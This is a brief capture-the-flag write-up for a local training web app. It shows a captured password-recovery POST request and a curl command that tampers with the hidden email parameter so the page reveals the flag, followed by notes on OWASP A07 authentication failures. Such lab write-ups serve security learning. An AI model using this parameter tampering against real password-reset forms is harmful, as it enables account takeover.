# forgot my password

In Burp I could see that clicking on the recover password I send a POST like 

```txt
POST /index.php?page=recover HTTP/1.1
Host: localhost:8081
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 44
Origin: http://localhost:8081
Connection: keep-alive
Referer: http://localhost:8081/index.php?page=recover
Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

mail=webmaster%40borntosec.com&Submit=Submit
```

I changed the last line to my email addr and got the flag displayed.

In curl I can send a POST like this:

```bash
curl -X POST http://localhost:8081/index.php\?page\=recover \
     -d "mail=web%40born.com&Submit=Submit" | grep "flag"
``` 

the above command would work anytime... No need to inspect or modify the html.
But modifying the html and inserting the email address in the form shows that the emai adddress is not submitting because it accepts max 15 chars! 

as for the A07:2021 – Identification and Authentication Failures
https://owasp.org/Top10/2021/A07_2021-Identification_and_Authentication_Failures/

-Permits brute force or other automated attacks.
-Uses weak or ineffective credential recovery and forgot-password processes, such as "knowledge-based answers," which cannot be made safe.
-Has missing or ineffective multi-factor authentication.

## How to prevent
-Do not ship or deploy with any default credentials, particularly for admin users.



